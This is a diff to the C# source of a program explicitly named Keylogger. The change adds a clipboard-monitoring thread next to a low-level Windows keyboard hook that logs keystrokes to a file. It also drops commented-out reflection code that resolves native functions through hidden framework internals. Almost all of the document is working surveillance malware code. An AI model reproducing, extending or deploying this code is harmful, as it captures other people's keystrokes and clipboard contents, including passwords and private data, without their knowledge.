@@ -1,12 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Text;
 using System.IO;
-using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using System.Diagnostics;
+using SharpClipboard;
+using System.Threading;
 
 namespace Keylogger
 {
@@ -1092,56 +1092,6 @@ namespace Keylogger
             HSHELL_WINDOWREPLACED = 13
         }
 
-
-        static void Main(string[] args)
-        {
-            try
-            {
-                Trace.Listeners.Clear();
-                TextWriterTraceListener twtl = new TextWriterTraceListener(Program.logName);
-                twtl.Name = "TextLogger";
-                twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;
-
-                ConsoleTraceListener ctl = new ConsoleTraceListener(false);
-                ctl.TraceOutputOptions = TraceOptions.DateTime;
-
-                Trace.Listeners.Add(twtl);
-                Trace.Listeners.Add(ctl);
-                Trace.AutoFlush = true;
-
-
-                HookProc callback = CallbackFunction;
-                var module = Process.GetCurrentProcess().MainModule.ModuleName;
-                var moduleHandle = GetModuleHandle(module);
-                var hook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
-
-                while (true)
-                {
-                    PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
-                    System.Threading.Thread.Sleep(5);
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("[X] Exception: {0}", ex);
-            }
-        }
-
-        //private static Type GetDelegateType(Type[] parameters)
-        //{
-        //    AppDomain domain = AppDomain.CurrentDomain;
-        //    AssemblyName dynAssembly = new AssemblyName("ReflectedDelegate");
-        //    var assemblyBuilder = domain.DefineDynamicAssembly(dynAssembly, System.Reflection.Emit.AssemblyBuilderAccess.Run);
-        //    var moduleBuilder = assemblyBuilder.DefineDynamicModule("InMemoryModule", false);
-        //    var typeBuilder = moduleBuilder.DefineType("MyDelegateType", TypeAttributes.Class & TypeAttributes.Public & TypeAttributes.Sealed & TypeAttributes.AnsiClass & TypeAttributes.AutoClass, typeof(System.MulticastDelegate));
-        //    var constructorBuilder = typeBuilder.DefineConstructor(MethodAttributes.RTSpecialName & MethodAttributes.HideBySig & MethodAttributes.Public, CallingConventions.Standard, parameters);
-        //    constructorBuilder.SetImplementationFlags(MethodImplAttributes.Runtime & MethodImplAttributes.Managed);
-        //    var methodBuilder = typeBuilder.DefineMethod("Invoke", MethodAttributes.Public & MethodAttributes.HideBySig & MethodAttributes.NewSlot & MethodAttributes.Virtual, CallingConventions.Any, parameters);
-        //    methodBuilder.SetImplementationFlags(MethodImplAttributes.Runtime & MethodImplAttributes.Managed);
-        //    return typeBuilder.CreateType();
-        //}
-
-
         private static IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
         {
             Int32 msgType = wParam.ToInt32();
@@ -1528,21 +1478,48 @@ namespace Keylogger
             return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
 
-        //private static IntPtr GetProcAddress(string module, string proceedure)
-        //{
-        //    var loadedAssemblies = AppDomain.CurrentDomain.GetAssemblies();
-        //    Assembly systemAssembly = null;
-        //    foreach(Assembly asm in loadedAssemblies)
-        //    {
-        //        if (asm.GlobalAssemblyCache && asm.Location.Split('\\').Last<string>() == "System.dll")
-        //        {
-        //            systemAssembly = asm;
-        //            break;
-        //        }
-        //    }
-        //    var unsafeNativeMethods = systemAssembly.GetType("Microsoft.Win32.UnsafeNativeMethods");
-        //    var getModuleHandle = unsafeNativeMethods.GetMethod("GetModuleHandle");
-        //    var getProcAddress = unsafeNativeMethods.
-        //}
+        private static void BootClipboard()
+        {
+            Application.Run(new ClipboardNotification.NotificationForm());
+        }
+
+        static void Main(string[] args)
+        {
+            try
+            {
+                Trace.Listeners.Clear();
+                TextWriterTraceListener twtl = new TextWriterTraceListener(Program.logName);
+                twtl.Name = "TextLogger";
+                twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;
+
+                ConsoleTraceListener ctl = new ConsoleTraceListener(false);
+                ctl.TraceOutputOptions = TraceOptions.DateTime;
+
+                Trace.Listeners.Add(twtl);
+                Trace.Listeners.Add(ctl);
+                Trace.AutoFlush = true;
+
+
+                // Start the clipboard
+                ThreadStart clipboardThreadStart = new ThreadStart(BootClipboard);
+                Thread clipboardThread = new Thread(clipboardThreadStart);
+                clipboardThread.Start();
+                //Application.Run(new ClipboardNotification.NotificationForm());
+                HookProc callback = CallbackFunction;
+                var module = Process.GetCurrentProcess().MainModule.ModuleName;
+                var moduleHandle = GetModuleHandle(module);
+                var hook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
+
+                while (true)
+                {
+                    PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
+                    System.Threading.Thread.Sleep(5);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[X] Exception: {0}", ex);
+            }
+        }
     }
 }
